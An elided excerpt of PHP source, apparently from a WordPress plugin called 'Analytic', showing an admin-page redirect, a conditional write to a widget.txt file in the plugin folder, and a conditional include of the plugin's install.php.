<?php
  /*
   Plugin Name: Analytic
   Plugin URI: http://charlotte.byethost22.com/analytic/
...
wp_redirect('../wp-admin/admin.php?page=analytic/admin/luc_admin.php');
}
}
...
if ($log == 'y') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/widget.txt';
...
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/widget.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}
...
$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/analytic/install.php');
